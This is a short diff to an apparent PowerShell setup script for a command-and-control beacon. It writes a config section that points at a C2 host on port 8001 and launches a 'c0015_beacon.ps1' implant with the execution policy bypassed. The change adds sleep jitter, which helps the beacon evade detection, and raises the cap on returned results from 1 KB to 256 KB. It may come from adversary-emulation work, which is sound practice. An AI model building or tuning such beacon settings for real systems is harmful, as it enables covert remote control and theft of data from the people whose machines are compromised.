@@ -60,7 +60,8 @@ $lines = @(
     '[beacon]'
     'loop_count=12'
     'loop_sleep_sec=2'
-    'result_cap_bytes=1024'
+    'loop_sleep_jitter_sec=2'
+    'result_cap_bytes=262144'
     "public_ip_check_url=http://${C2Host}:8001/myip"
     'public_ip_check_enabled=0'
     "beacon_cmd=powershell.exe -NoProfile -ExecutionPolicy Bypass -File $PublicDir\c0015_beacon.ps1 -Config $PublicDir\config.ini"
